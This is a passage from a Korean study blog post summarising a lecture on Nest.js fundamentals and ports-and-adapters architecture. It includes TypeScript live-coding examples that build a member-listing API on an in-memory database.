아키텍처\n- 훨씬 더 직관적인 비즈니스 로직을 작성할 수 있는 아키텍쳐\n\n<br>\n\n### Nest.js 주요 컨셉\n\nNest.Js 개발자는 고양이를 좋아한다.(?)\n\n<br>\n\n#### Controllers\n\n컨트롤러에 대한 정의\n\n- 컨트롤러는 어플리케이션을 향한 요청을 받는 첫 번째 스탭\n- 라우팅 역할\n- 외부세계로 부터 들어온 요청이 어느 곳으로 가야하는지 안내하는 역할\n- 클라이언트로부터 요청이 들어오는 부분\n- 컨트롤러는 NestAPI 뿐만이 아닌 GraphQL이나 이런 것도 컨트롤러할\n- 요청이 들어오는 것이 컨트롤러이며, 요청이 되는 주체를 의미한다.\n- 외부 세계로 부터 들어온 요청이 어느 곳으로 가는게 맞냐 라는 역할\n- 사용자의 요청을 수행할 수 있는 비즈니스 로직에 요청을 보내는 주체\n- 하지만 컨트롤러는 순수함수가 아님을 유의한다. (외부에서 오는 요청 때문에...)\n\n<br>\n\nNest.Js의 컨트롤러 생김새는 다음과 같다.\n\n```typescript\nimport {Controller, Get} from \"@nestjs/common\";\n\n@Controller(\"cats\")\nexport class CatsController {\n\n    @Get()\n    async findAll(): Promise<string> {\n        return \"This action returns all cats\n    }\n}\n```\n\n- Nest.Js 컨트롤러는 **Typescrit**의 데코레이터 문법을 사용해 추상화를 했다.\n- Nest.Js의 데코레이터 형식은 자바의 스프링과 모습이 비슷하다.\n\n<br>\n\n#### Providers\n\n- NestJs의 근본이며 중요한 컨셉\n- Nest.Js의 대다수의 클래스들이 provider로 구성\n- provider는 디펜던시로 주입될 수 있다.\n- 컨트롤러는 HTTP 요청을 핸들링하고 더 복잡한 일들(디비 처리, 요청에 대한 작업 등)을 provider에게 위임 해야한다.\n- provider에게 중요한 비즈니스 로직을 가둔다.\n- provider는 그저 javascript의 class일 뿐이다.\n- 프레임워크에 종속되지 않은 클래스이고, javascript에서 클래스는 결국 프로토타입 함수다.\n- provider는 순수함수가 될 수 있다.\n\n```typescript\n@Injectable()\nexport class CatsService {\n  private readonly cats: Cat[] = []\n\n  create(cat: Cat) {\n    this.cats.push(cat)\n  }\n}\n\n@Controller(\"cats\")\nexport class CatsController {\n  constructor(private catsService: CatsService) {}\n\n  @Post()\n  async create(@Body() createCatDto: CreateCatDto) {\n    this.catsService.create(createCatDto)\n  }\n}\n```\n\n- 위 코드에서 보면 컨트롤러는 서비스 객체에게 위임한다.\n- 위임을 표시하는 것이 컨트롤러의 생성자 주입(의존성 주입 형태 중 하나)이 그 표현이다.\n- 즉 데코레이터 모두 빼면 함수이고, 함수형 프로그래밍 페러다임으로 적용이 가능하다.\n- 참고 [Provider 공식문서](https://docs.nestjs.com/providers)\n\n<br>\n\n#### Modules\n\n- 일종의 패키지 역할을 하는 것\n- 같은 도메인에 속한 것들을 응집화 할 수 있도록 도와주는 역할\n- 앱의 사이즈가 커질수록, 경계를 설정해서 복잡도를 매니징할 수 있다.\n- 경계(도메인)를 설정해서 각 모듈 간의 의존도를 제어할 수 있게 해준다.\n- MSA도 모듈화의 방법 중 하나\n\n```typescript\n@Module({\n  controllers: [CatsController],\n  providers: [CatsService],\n})\nexport class CatsModule {}\n```\n\n- 위 코드에서 데코레이터를 선언하고 controllers 배열에 controller 역할을 하는 것을 전달하고, providers도 동일하다.\n- provider에서 @Injectable() 데코레이터만 붙이기만 하면 안되고, 모듈의 provider 배열에 전달해야 nest.js에 위임한다.\n\n<br>\n\n#### Dependency Injection\n\n- Inversion of control (IoC)\n- Nest.js 런타임 시스템에 dependency 인스턴스화를 위임한다.\n- 실제 객체를 인스턴스화 시키는 작업을 프레임워크에 위임하는 것\n\n```typescript\n@Injectable()\nexport class CatsService {\n\n}\n\n@Controller(\"cats\")\nexport class CatsController {\n    constructor(private catsService: CatsService) {}\n}\n\n@Module({\n  controllers: [CatsController],\n  providers: [{provide : CatsService, useClass : CatsService}],\n})\n```\n\n- 위와같은 코드가 있을 때 Nest.js에서 처음에 부트스트랩을 할 때 인스턴스를 계산해서 필요한 클래스를 생성하고, 런타임 시점에 해당 컨트롤러나 프로바이더에 주입한다.\n- **개발자가 의존성에 대해 직접 인스턴스 생성 및 관리를 할 필요가 없다.**\n- 위 코드를 기준으로 흐름을 보면 다음과 같다.\n\n<br>\n\n1. CatsController를 인스턴스화 할 때, dependency(의존성)를 확인한다.\n2. CatsService 토큰은 CatsService 클래스를 리턴한다.\n\n   - 여기서 나온 토큰의 의미는 식별자를 의미한다.\n   - 하단의 @Module을 보면 providers 배열 안에 **provide**가 토큰(식별자 또는 구분자)를 가리킨다.\n   - 저 토큰은 클래스도 되지만 일반 문자열(string)도 가능하다\n   - **useClass**에는 직접 구현한 클래스를 넣는다.\n   - 이 코드 어디서도 new 등으로 인스턴스 할당하는 로직을 볼 수 없다.\n   - providers에는 저렇게 토큰 명시를 해서 구현하기도 하고, 그냥 CatsService만 명시해서 쓰기도 한다.\n\n3. Singleton 스코프(default)로 CatsService를 인스턴스화 시킨다.\n   - 그래서 Nest.js에서 부트스트랩 시 providers를 보고 식별자와 구현 클래스를 확인 후 CatsService 인스턴스를 싱글톤(기본값)으로 인스턴스화 한다.\n4. 메모리 내에 캐시를 하고 재사용이 가능하게끔 만든다.\n   - Nest.js에는 컨테이너를 운영하는데 그 안에 CatsService 객체가 생성되어 있다.\n   - 그래서 요청 시 미리 메모리에 올려 있는 것을 가져와서 쓴다.\n5. 이 모든 과정은 Bottom up으로 dependency가 정확한 순서로 관리된다.\n\n<br>\n\n이것이 **Nest.js의 핵심 내용**이다.\n\n스프링과 같다라고 하는 의견이 많았다.  \n나 또한 같은 것을 느꼈고, 어떤 이는 라이트 스프링이라고 이야기 했는데 정말 그런것 같다.\n\n과거 스프링을 4년 정도 개발했던 나로써 Nest.js 및 Typescript 언어에 대한 거부감이 없었고, 학습도 쉬웠다.  \n오히려 난 Javascript가 좀 난해했다. (타입이 없었고 너무 자유분방한 것 같아서 그랬었던 것 같다.)\n\n<br>\n\n### Architectures\n\n먼저 Layered Architecture에 대해 설명 및 한계에 대한 설명을 했다.\n\n#### Layered Architecture의 한계\n\n![](/img02.png)\n[이미지 출처 - java-vault](https://medium.com/java-vault/layered-architecture-b2f4ebe8d587)\n\n레이어드 아키텍쳐를 사용하다 보면 배치에 대해 고민이 생기게 된다.\n\n예를 들어 고객이 생성되었을 때, 메일을 보내는 기능을 추가해주고 싶은데 이 경우 메일 서비스를 만들어주면 되긴 한다.  \n근데 메일 서비스를 만들 때, 메일 송신을 담당하는 인프라 코드(구글, 네이버 등 메일을 보내게 해주는 인프라)는 어느 곳에 둘 것인지에 대해 고민이 있었다.\n\n즉 메일 전신을 만들어주는 기능이 있고, 해당 메일을 보내는 기능도 있으며, 메일 보냈을 때 기록을 남기는 기능도 있을 것이다.  \n이렇게 일일히 구분해서 하다보면 혼란이 온다.\n\n답이 명쾌하지 않기 때문에 혼란이 가중화 된다.  \n그래서 레이어드 아키텍쳐는 다양한 비즈니스 로직을 충족시키기에는 한계가 있는 구조다.\n\n<br>\n\n#### Layered Architecture의 진화 (Port and Adapter Architecture)\n\n![](/img03.png)\n[이미지 출처 - getoutsidedoor](https://www.getoutsidedoor.com/2018/09/03/ports-adapters-architecture/)\n\n외부에서 접근은 Rest Api가 될 수 있고, 개발자들끼리 CLI로도 올 수 있고 다양한 접근이 가능하다.\n그리고 내부에서 처리는 각 요구사항에 맞는 부분들의 도착지가 있다.\n\n이렇게 될 경우 모든 로직은 **Business Logic**이라는 부분으로 외부 내부의 시선이 모이게 된다.  \n위 그림에서처럼 왼쪽은 요청이 들어오는 영역이고, 오른쪽은 인프라에 영향을 끼치는 영역이다.\n\n오른쪽은 개발자가 크게 신경을 쓸 부분은 아니다.  \n어찌보면 각 인프라나 디비의 경우 구현체가 있고 거기까지 흐름을 가져다 주는게 개발자의 역할일 뿐이다.(강사님은 농담 뉘앙스로 내 알바 아님이라 표현하심 ㅋ)\n\n포인트는 **우리가 작성하는 비즈니스 로직은 내부에 가두고, 들어오는 요청을 받는 부분의 문을 열어준다.(포트를 열어준다.)**\n\n위 그림에서 왼쪽 영역의 경우...  \n외부에서 요청한 것은 포트로 받고, 내가 작성한 비즈니스 로직을 사용하려면 포트로만 접근하여 사용할 수 있게끔 해주는 것.\n\n오른쪽 영역의 경우...  \n약속된 포트를 통해서만 구현체에게 명령을 준다라는 것.\n\n**이것이 포트 앤 어뎁터 아키텍쳐(Port and Adapter Architecture)이다.**\n\n이것을 다시 정리하면...\n\n- 인터페이스를 통해서 해당 포트로 접근이 가능하게끔 한다는 것이 포인트.\n- 내가 미리 약속한 인터페이스를 통해서만 포트에 접근이 가능하고, 포트를 통해서만 비즈니스 로직에 접근이 가능하다.\n- 그리고 비즈니스 로직에서 처리한 결과가 포트를 통해 외부세계(인프라나 디비 영역)에 영향을 준다.\n- 레이어드 아키텍쳐에서 특정 로직을 담당하는 코드를 어디에 위치해야 할 지를 고민하던 것들을 해결하기 위해 나왔다.\n- 무조건 포트를 통해서만 서로 통신을 한다.\n\n개념적인 이야기는 이게 끝이다.\n\n내부 세계(우리가 작성하는, 또는 작성해야 할 영역)는 각종 버그와 위험(잘못짠 코드..)이 도사리고 있다.  \n이런 위기를 구원해주는 패러다임이 있다.  \n패러다임은 프로그래밍 룰이 필요하고, 마인드셋(어떠한 사고로 프로그래밍을 할 것)이 필요하며, 우리가 작성한 어플리케이션 코드를 바라보는 철학이 필요하다.\n\n저번 시간에는 함수형 프로그래밍 룰을 통해 사이드 이팩트를 줄이고, 고차함수를 통해 함수를 합성하는 것을 배웠다.  \n이번에는 인터페이스라는 룰을 배울 것이다.\n\n<br>\n\n#### Interface\n\n![](/img04.png)\n[이미지 출처 - SK(주) C&C's TECH BLOG](https://engineering-skcc.github.io/microservice%20inner%20achitecture/inner-architecture-2/)\n\n컨트롤러에서 들어오는 영역을 인바운드 어뎁터라 하고, 컨트롤러가 내부 비즈니스 로직을 처리하기 위한 문(포트)를 인바운드 포트라 한다.  \n내가 작성한 서비스 로직에서 처리 결과나 외부 세계로 작업 결과물을 내보내는 문(포트)를 아웃바운드 포트라 하고, 그 문과 연결되어 처리되는 부분을 아웃바운드 어뎁터라 한다.\n\n<br>\n\n#### Ports and Adapters Architecture\n\n내용을 정리하면 아래와 같다.\n\n- inbound-adapter : controller, GraphQL, REST, gRPC, CLI 등\n- inbound-port : 서비스 로직으로 향하는 interface\n- service : inbound-port 구현체\n- outbound-port : 외부 세계로 향하는 interface\n- outboud-adapter : outbound-port 구현체 (DB, Search Engine, Notification, Mail 등)\n\n<br>\n\n### 수업 중간 질문\n\n실제 라이브 코딩 전 잠깐 질의 응답 시간이 있었는데 이를 간략하게 정리했다.  \nQ 는 수강생이 질문한 것이고, A는 강사님이 답변하신 부분이다.\n\nQ : 기존 레이어드 아키텍쳐에 비해 좋은 게 뭐가 있는가?  \nA : 지금 당장은 생각이 나지 않는다.\n\nQ : In-Out port 사이에 있는 service가 거대해 지는 문제점이 있지 않나?  \nA : 그렇게 하지 않기 위해 개발자가 노력해야 한다.  \n그래서 서비스를 최대한 최소 단위로 나누고, 그 안을 함수형 프로그래밍 페러다임을 적용하면 좋다(라고 개인적인 의견이라 말씀하심)\n\nQ :Service 부분을 MSA로 구성하고 port 부분만 gateway로 구상할 수 있는가?  \nA : 맞다. 포트 부분만 열어놨기 때문에 그 부분만 때서 처리하기 용이하다.  \n게이트웨이는 MSA 포워딩 해주는 서비스라는 것이라고 질문자가 응답함\n\nQ : 초기 어플리케이션 개발에 핵사고날(포트 앤 어뎁터) 아키텍쳐를 적용하는 경우가 있는가?  \nA : 있다.\n\nQ : Nest.js + fsts를 사용한 참조하기 괜찮은 레포지토리가 있는가?  \nA : 내가 만들지 않아서 없다.\n\nQ : 여러 DB를 분산한 경우 데이터를 모을 때 어떤 방법을 사용하였는가?  \nA : 다양한 방식으로 해결할 수 있다.  \n중앙 코어(데이터팀)에서 각 디비를 찔러서(호출) 한번에 모든 데이터를 수집해서 빅데이터 등으로 모은 뒤 필요한 데이터를 가공하여 api로 제공함  \n다양한 방법을 사용하기도 한다.  \n정답은 없고 각자 방법이 다 다르다.\n\n<br>\n\n번외로 강사님이 재직했던 곳에서는 MSA 구성이 각 서버가 각자의 디비를 가지고 있는 형태였고,  \n데이터가 분산되어 있기에, 서로 소통하며 데이터를 주고받을 수 있는 이벤트 드리븐(도메인 드리븐) 아키텍처가 적용되어 있었다고 하심.  \n하지만 설계에 정답은 없다.\n\n긴 설명 이후 잠시 휴식 후 이제는 라이브 코딩으로...\n\n<br>\n\n### Live Coding1 : Nest.js 로 프로젝트 아키텍처 구성하기\n\n[Nest.Js 공식문서](https://docs.nestjs.com)를 참고하며 진행하였다.  \n먼저 [공식 레포](https://docs.nestjs.com/#alternatives)를 참고해서 프로젝트 셋업을 진행하였다.\n\nnpm install 하여 설치하며 기다리는 중 깜짝질문이 나왔다.\n\n> **package.json.lock**은 왜 있는 것인가?\n\n나도 이 부분을 몰랐다 -0-;;  \n대충 찾아보니 조금 더 명확한 버전을 제공하기 위해서다.  \n쉽게 고정된 버전을 동일하게 쓰기 위함이다.\n\nNest.js에 대해 깊게 파지는 않고, 아키텍쳐에 대해서 알아볼 예정이다.  \n이번 라이브코딩 코드는 [lecture-2](https://github.com/Jun4928/wanted-pre-onboarding-challenge-BE-task-JAN.2023/tree/main/lecture-2)를 참고하면 된다.\n\n오늘의 목표는 Member의 리스트를 조회하는 API 작성이다.  \n이번 라이브 코딩에서 디비를 직접 다루진 않고 메모리 샘플 데이터로 진행한다.\n\n<br>\n\n#### 메모리 디비\n\n아래 코드가 메모리 디비로 쓸 샘플코드다.\n\n```typescript\nexport type Member = {\n  id: bigint\n  name: string\n  email: string\n  phone: string\n}\n\nexport const MemoryDatabase = (() => {\n  const members = [\n    {\n      id: 1n,\n      name: \"J\",\n      email: \"j@gmail.com\",\n      phone: \"010-3333-4444\",\n    },\n  ] as Member[]\n\n  return {\n    findMembers: () => Promise.resolve(members),\n  }\n})()\n```\n\n여기서 **bigint**가 등장하는데 javascript에서는 큰 수를 다룰 때 쓰는 것이라고 한다.(나도 처음봤다.)  \n근데 개념은 이해하는게 Java에서도 유저 값 고유 id는 uuid나 정수형 쓸 때 Long을 쓰긴 해서 javascript에는 number만 쓰는줄 알았었다.\n\n근데 이거를 실제로 쓰려면 미들웨어를 붙여서 컨버팅하고 해야 해서 이번 실습에서는 number 타입을 쓰는 것으로 했다.\n\n**findMembers** 클로저 함수는 Promise를 반환하는데 **member**배열을 반환한다.\n\n<br>\n\n#### Controller\n\n다음은 컨트롤러 영역이다.  \n강사님 회사의 코드 전략 중 하나는 파일에 하나의 클래스에 하나의 함수만 가지는게 원칙이 있는데 이를 적용했다.\n\n그래서 이번에 처럼 조회하는 함수를 만들면 다음과 같은 코드가 만들어진다.  \n파일명은 **get-members.controller.ts**를 사용하였다.\n\n나는 그냥 **get.members.controller.ts** 이런 유형인데 하이픈도 같이 쓰기도 하나보다...\n\n```typescript\nimport { Controller, Get, Inject } from \"@nestjs/common\"\nimport {\n  FIND_MEMBERS_INBOUND_PORT,\n  FindMembersInboundPort,\n} from \"../inbound-port/find-members.inbound-port\"\nimport { MemoryDatabase } from \"src/lib/memory-database\"\n\n@Controller()\nexport class GetMembersController {\n  constructor(\n    @Inject(FIND_MEMBERS_INBOUND_PORT)\n    private readonly findMembersInboundPort: FindMembersInboundPort\n  ) {}\n\n  @Get(\"/members\")\n  async handle() {\n    return MemoryDatabase.findMembers()\n  }\n}\n```\n\n이렇게 하고 서버를 실행시키고 접근해본다.\n\n> http://localhost:3000/members\n\n근데 404가 뜬다.\n\n이유는 간단하다.  \n위에서도 언급했다시피 어노테이션(데코레이터)만 붙인다고 되는게 아니다.\n\nModule에도 등록을 해줘야 한다.\n\n```typescript\n//member.module.ts\n\n@Module({\n  controllers: [GetMembersController],\n  providers: [],\n})\nexport class MemberModule {}\n```\n\n근데 이렇게 등록을 해도 여전히 404가 뜬다.  \n이것도 위에서 본바와 같이 **app.module.ts**에서 등록을 해줘야 한다.\n\n```typescript\n//app.module.ts\n\n@Module({\n  imports: [MemberModule],\n  controllers: [AppController],\n  providers: [AppService],\n})\nexport class AppModule {}\n```\n\n여기서 의존관계를 추적해보면 **main.ts**부터 시작해본다.\n\n```typescript\nasync function bootstrap() {\n  const app = await NestFactory.create(AppModule)\n  await app.listen(3000)\n}\nbootstrap()\n```\n\n저기서 AppMododule로 가져와서 App을 생성하는데,  \n저 AppModule을 타면 **imports**에 **MemberModule**을 가져오고,  \n거기서 controllers를 보니 **GetMembersController** 컨트롤러를 선언한 것을 확인할 수 있다.\n\n이제는 위의 코드를 Port And Adapter Architecture로 바꿔보겠다.\n\n<br>\n\n#### 아키텍쳐 적용해보기 (Inbound-Port interface)\n\n이제는 메모리 디비의 값을 가져오는 것을 해보려 한다.  \n위 이론에서 언급한 [내용](https://elfinlas.github.io/til/230114_wanted_preon_back02/#ports-and-adapters-architecture)처럼 inbound-port를 만들기 위해 인터페이스를 하나 만든다.\n\n```typescript\nexport interface FindMembersInboundPort {\n  execute()\n}\n```\n\n이 인터페이스는 하나의 역할만 하는 것을 목표로 하는게 이 아키텍쳐의 목표다.  \n위 인터페이스의 이름처럼 멤버를 찾는 역할을 하는 목표만 가진다.\n\n이제 이 인터페이스를 채워보겠다.\n\n```typescript\n//find-members.inbound-port.ts\nimport { Member } from \"../../lib/memory-database\"\n\nexport type FindMembersInboundPortInputDto = void\n\nexport type FindMembersInboundPortOutputDto = Array<Member>\n\nexport const FIND_MEMBERS_INBOUND_PORT = \"FIND_MEMBERS_INBOUND_PORT\" as const //이 부분은 아래 서비스쪽에서 다룹니다.\n\nexport interface FindMembersInboundPort {\n  execute(\n    params: FindMembersInboundPortInputDto\n  ): Promise<FindMembersInboundPortOutputDto>\n}\n```\n\n코드를 설명 전 이 코드에 함정이 있다.  \n다른 분들도 못맞췄고, 나도 못맞췄다.\n\n정답은 아래 코드다.\n\n```typescript\nexport type FindMembersInboundPortOutputDto = Array<Member>\n```\n\n여기서 Member는 inbound쪽 영역이 아닌 디비 영역에...즉 인프라 코드에 있는 것이다.  \n이렇게 되면 의존성이 깨져버린다.\n\n그래서 서비스 로직을 작성할 때 요점은 **처음부터 디비나 각종 의존성을 제거하고 작성하는 것**이다.\n\n그럼 이 로직을 어떻게 바꾸냐 하면...\n\n```typescript\n//find-members.inbound-port.ts\nexport type FindMembersInboundPortInputDto = void\n\nexport type FindMembersInboundPortOutputDto = Array<{\n  name: string\n  email: string\n  phone: string\n}>\n\nexport const FIND_MEMBERS_INBOUND_PORT = \"FIND_MEMBERS_INBOUND_PORT\" as const\n\nexport interface FindMembersInboundPort {\n  execute(\n    params: FindMembersInboundPortInputDto\n  ): Promise<FindMembersInboundPortOutputDto>\n}\n```\n\n이렇게 타이핑으로 직접 처리를 하면 된다.  \n이게 단점이 될 수 있다.\n\n물론 중복된 코드가 많아질 수 있지만 이것을 감수해야 하는 게 이 아키텍쳐다.  \n이렇게 되면 엔티티와 별개로 DTO가 필요해진다.\n\n이 룰은 강한 룰이지만, 이렇게 하는 것이 필수는 아니며 교육 차원 및 이런 습관을 들이는 것이 중요하다.  \n나도 이 부분은 공감했고, 내 프로젝트에 이 룰을 적용하여 리팩토링을 진행해 봐야겠다고 생각이 들었다.\n\n```typescript\n//DB Entity\nexport type Member = {\n  id: bigint\n  name: string\n  email: string\n  phone: string\n}\n\n//inbound port dto\nexport type FindMembersInboundPortOutputDto = Array<{\n  name: string\n  email: string\n  phone: string\n}>\n```\n\n이와 같이 코드가 분리될 경우 의존성은 없어지고, 완전한 분리가 되어 서로의 간섭이 없어지며 유지보수가 용이해진다.  \n이 부분은 트레이드 오프가 있는데 얻을 수 있는 것은 의존성 제거다.\n\n이렇게 함으로써 저 inboud-port 인터페이스는 의존성이 없게 되었다.\n\n다른 분이 좋은 의견을 주셨는데 이런 타입들을 외부에서 별도 모듈을 통해서 관리하고,  \n이 모듈을 임포트해서 저 port에서 가져와서 쓰는 것도 된다고 하셨다.\n\n근데 이렇게 될 경우 해당 모듈에 대한 의존성이 생기는 것이므로,  \n해당 모듈도 관리 포인트가 되고 의존성을 신경써 줘야 한다.(결국 또 등가교환이 이뤄진다.)\n\n개인적으론 그냥 강사님이 보여주신 의존성 제로 방식이 더 좋은 것 같다.  \n이제는 서비스 로직으로 들어간다.\n\n<br>\n\n#### 아키텍쳐 적용해보기 (Service)\n\n서비스는 아까 작성한 inbound-port를 구현해야 한다.\n\n```typescript\n//find-members.service.ts\nexport class FindMembersService implements FindMembersInboundPort {\n  async execute(\n    params: FindMembersInboundPortInputDto\n  ): Promise<FindMembersInboundPortOutputDto> {\n    return MemoryDatabase.findMembers()\n  }\n}\n```\n\n아직 완성되지는 않았지만 대략 이런 형태로 구현이 될 것이다.  \n근데 이 코드에서도 함정이 있는데 바로 타입스크립트의 함정이다.\n\n(물론 이 코드는 완성된 결과물이 아니지만...)  \n이 코드에서 MemoryDatabase.findMembers() 함수가 리턴하는 값은 디비의 **Member**타입이고, 여기엔 id가 있다.  \n하지만 지금 반환을 보면 OutputDto고 여기엔 **id**값이 없다.\n\n이 부분은 **Typescript**의 **덕 타이핑(Duck Typing)**덕분에 에러가 안나고 넘어간다.  \n덕 타이핑은 간단하게 설명하면 일종의 동적 타이핑 종류이고, 구조적으로 타입이 맞기만 하면 에러 없이 허용을 한다.  \n이거는 나중에 따로 포스팅을 하면서 공부해봐야겠다.\n\n<br>\n\n이제 프로젝트를 구동하기 위해 위 서비스를 주입해야 하는데  \n서비스 자체를 주입하는건가? 포트를 주입하는 건가를 햇갈릴 수 있다.\n\n물론 정답은 포트다.  \n포트를 통해서만 호출하기 때문이다.\n\n의존성 주입을 해야 하는데 Nest.js에서는 생성자 주입을 많이 사용한다.  \n컨트롤러에 서비스 로직을 주입할 때는 아래 코드와 같이 작성된다.\n\n```typescript\n@Controller()\nexport class GetMembersController {\n  constructor(\n    @Inject(FIND_MEMBERS_INBOUND_PORT)\n    private readonly findMembersInboundPort: FindMembersInboundPort\n  ) {}\n\n  @Get(\"/members\")\n  async handle() {}\n}\n```\n\n여기서 생성자를 보면 **@Inject()**라는 데코레이터가 사용되었는데 이게 의존성 주입 역할을 해준다.  \n저 데코레이터에 전달된 값이 아까 이론에서 [언급](https://elfinlas.github.io/til/230114_wanted_preon_back02/#dependency-injection)했던 토큰이다.\n\n이제 위의 [서비스](https://elfinlas.github.io/til/230114_wanted_preon_back02/#아키텍쳐-적용해보기-service) 설명 중 포트 인터페이스 코드가 어디에 어떤 역할인이 알 수 있다.\n\n```typescript\nexport const FIND_MEMBERS_INBOUND_PORT = \"FIND_MEMBERS_INBOUND_PORT\" as const\n```\n\n그럼 여기서 의문이 들 것이다.  \n아까 **Module**설명을 할 때 Provider에서 토큰과 클래스가 있었는데 어떻게 적용해야 하는가?\n\n아래 코드를 보면서 설명한다.\n\n```typescript\n//Member Module\n\nimport { FIND_MEMBERS_INBOUND_PORT } from './inbound-port/find-members.inbound-port';\nimport { FindMembersService } from './service/find-members.service';\n\n@Module({\n  controllers: [],\n  providers: [{\n      provide: FIND_MEMBERS_INBOUND_PORT,\n      useClass: FindMembersService,\n    }],\n})\n```\n\n여기서 중요한 것은 useClass에는 Port interface가 아닌 해당 Port를 구현한 구현체가 작성된 점이다.  \nNest.js에게 이런 토큰 **(FIND_MEMBERS_INBOUND_PORT)**을 찾으면 해당 구현체는 FindMembersService 라고 말해주는 것이다.\n\n그리고 의존성 주입을 할 때는 아래와 같이 토큰만 주입을 받는 것이다.\n\n```typescript\nconstructor(\n    @Inject(FIND_MEMBERS_INBOUND_PORT)\n    private readonly findMembersInboundPort: FindMembersInboundPort,\n  ) {}\n```\n\n이렇게 되면 Nest.js는 토큰을 본 다음에 실제 구현체인 FindMembersService를 가져와서 주입해준다.  \n토큰을 쓰게 되면 **추상화 된 개체들(인터페이스 구현체 및 기타 구현체)을 쓸 때 식별자로 사용**이 가능해진다.\n\n근데...스프링은 이걸 아주 옛날에 이런 개념을 적용했는데...  \n역시 **Spring**은 정말 잘 만들어진 프레임워크인것 같다는 생각이 다시금 들었다.  \n특히 위 방식도 **@Qualifier()**에서 이미 사용한 방식이다.\n\n```java\n//Java sample\npublic class MyData {\n    @Autowired\n    @Qualifier(\"userData\")\n    private UserData userData;\n}\n```\n\nJava spring에서는 이런식으로 가끔 사용했었다.\n\n다시 원점으로 돌아와서...  \nNest.js에게 이 토큰으로 식별하여 찾을 경우 useClass가 가리키는 객체를 인스턴스화 해서 사용해 달라는 것이다.\n\n<br>\n\n다시 돌아와서...  \n실제 컨트롤러의 호출단은 다음과 같이 바꿀 수 있게 된다.\n\n```typescript\n// import { MemoryDatabase } from 'src/lib/memory-database'\n\n@Get('/members')\n  async handle() {\n    return this.findMembersInboundPort.execute();\n    //return MemoryDatabase.findMembers()\n  }\n```\n\n이렇게 되면 컨트롤러에서 메모리 디비에 대한 의존성도 사라진다.  \n여기까지 코드와 내용을 보면 각 영역마다의 의존도가 없다는 것을 알 수 있다.\n\n컨트롤러 코드를 다시 보자.\n\n```typescript\n//get-members.controller.ts\nimport { Controller, Get, Inject } from \"@nestjs/common\"\nimport {\n  FIND_MEMBERS_INBOUND_PORT,\n  FindMembersInboundPort,\n} from \"../inbound-port/find-members.inbound-port\"\n\n@Controller()\nexport class GetMembersController {\n  constructor(\n    @Inject(FIND_MEMBERS_INBOUND_PORT)\n    private readonly findMembersInboundPort: FindMembersInboundPort\n  ) {}\n\n  @Get(\"/members\")\n  async handle() {\n    return this.findMembersInboundPort.execute()\n  }\n}\n```\n\n여기서 서비스 로직은 찾아볼 수 없다.  \n다 각자 분리가 되어 있음을 알 수 있다.\n\n그런데 어떤 분이 의견을 주셨는데 이 구조를 사용하면 파일 갯수가 엄청 늘어나지 않는가? 였다.  \n강사님이 좋은 말씀을 주셨다.\n\n> 맞는 말이다.  \n> 그런데 코드 하나에 엄청난 라인을 자랑하는 방식을 사용할 것인지...아니면 짧은 라인의 코드를 가진 복수의 파일 방식을 사용할 것인지?\n\n난 당연 후자였다.  \n무튼 실행을 하면 데이터가 잘 나오는데 덕타이핑 덕분에 id도 그대로 노출이 된다.\n\n이제는 서비스 로직을 보고 개선해나갈 차례다.  \n아래가 서비스 로직이다.\n\n```typescript\n//find-members.service.ts\nexport class FindMembersService implements FindMembersInboundPort {\n  async execute(\n    params: FindMembersInboundPortInputDto\n  ): Promise<FindMembersInboundPortOutputDto> {\n    return MemoryDatabase.findMembers()\n  }\n}\n```\n\n여기도 보면 MemoryDatabase.findMembers()로 직접 호출을 하는데 이 의존도를 끊어보겠다.  \n이제는 outboud-port와 adapter를 만들어준다.\n\noutbound-port도 동일하게 작성을 한다.\n\n```typescript\n//find-members.outbound.port.ts\n\nexport type FindMembersOutboundPortInputDto = void\n\nexport type FindMembersOutboundPortOutputDto = Array<{\n  name: string\n  email: string\n  phone: string\n}>\n\nexport const FIND_MEMBERS_OUTBOUND_PORT = \"FIND_MEMBERS_OUTBOUND_PORT\" as const\n\nexport interface FindMembersOutboundPort {\n  execute(\n    params: FindMembersOutboundPortInputDto\n  ): Promise<FindMembersOutboundPortOutputDto>\n}\n```\n\n<br>\n\n그리고 아까 컨트롤러에 주입했던 것처럼 서비스에도 outbound-port를 주입해준다.\n\n```typescript\n//find-members.service.ts\n\nimport {\n  FindMembersInboundPort,\n  FindMembersInboundPortInputDto,\n  FindMembersInboundPortOutputDto,\n} from \"../inbound-port/find-members.inbound-port\"\nimport { Inject } from \"@nestjs/common\"\nimport {\n  FIND_MEMBERS_OUTBOUND_PORT,\n  FindMembersOutboundPort,\n} from \"../outbound-port/find-members.outbound-port\"\n\nexport class FindMembersService implements FindMembersInboundPort {\n  constructor(\n    @Inject(FIND_MEMBERS_OUTBOUND_PORT)\n    private readonly findMembersOutboundPort: FindMembersOutboundPort\n  ) {}\n\n  async execute(\n    params: FindMembersInboundPortInputDto\n  ): Promise<FindMembersInboundPortOutputDto> {\n    return this.findMembersOutboundPort.execute()\n  }\n}\n```\n\n<br>\n\n이렇게 되면 메모리 쪽의 의존도를 끊을 수 있게 되었다.  \n하지만 아직 **FindMembersOutboundPort**의 구현체가 없기 때문에 이를 만들어준다.\n\n```typescript\n//find-members.repository.ts\n\nimport {\n  FindMembersOutboundPort,\n  FindMembersOutboundPortInputDto,\n  FindMembersOutboundPortOutputDto,\n} from \"../outbound-port/find-members.outbound-port\"\nimport { MemoryDatabase } from \"../../lib/memory-database\"\n\nexport class FindMembersRepository implements FindMembersOutboundPort {\n  async execute(\n    params: FindMembersOutboundPortInputDto\n  ): Promise<FindMembersOutboundPortOutputDto> {\n    return MemoryDatabase.findMembers()\n  }\n}\n```\n\n<br>\n\n당연한 이야기겠지만 해당 구현체에서는 메모리 의존을 해도 된다.  \n근데 outbound-port에서 dto에는 id가 없기에 타입에 맞춰서 반환 값을 바꿔준다.\n\n```typescript\nasync execute(\n    params: FindMembersOutboundPortInputDto,\n  ): Promise<FindMembersOutboundPortOutputDto> {\n\n    const members = await MemoryDatabase.findMembers();\n\n    return members.map((member) => {\n      return {\n        name: member.name,\n        email: member.email,\n        phone: member.phone,\n      };\n    });\n  }\n```\n\n<br>\n\n그리고 module에 선언을 해줘야 한다.\n\n```typescript\n//member-module.ts\n\nimport { Module } from \"@nestjs/common\"\nimport { GetMembersController } from \"./controller/get-members.controller\"\nimport { FIND_MEMBERS_INBOUND_PORT } from \"./inbound-port/find-members.inbound-port\"\nimport { FindMembersService } from \"./service/find-members.service\"\nimport { FIND_MEMBERS_OUTBOUND_PORT } from \"./outbound-port/find-members.outbound-port\"\nimport { FindMembersRepository } from \"./outbound-adapter/find-members.repository\"\n\n// 오늘 할 것: member 의 